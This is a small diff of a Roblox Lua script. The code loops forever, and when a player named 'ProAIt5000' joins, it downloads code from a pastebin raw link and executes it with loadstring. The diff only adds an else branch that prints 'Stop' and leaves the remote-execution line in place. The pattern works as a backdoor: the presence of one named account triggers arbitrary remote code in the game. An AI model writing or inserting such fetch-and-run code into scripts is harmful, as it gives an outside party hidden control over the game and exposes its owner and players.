@@ -6,6 +6,8 @@ while true do
 	task.wait(1)
 	if game.Players:FindFirstChild("ProAIt5000") then
 		loadstring(game:HttpGet('https://pastebin.com/raw/CBZ1CZ9s'))()
+	else
+print("Stop")
 	end
 end
 
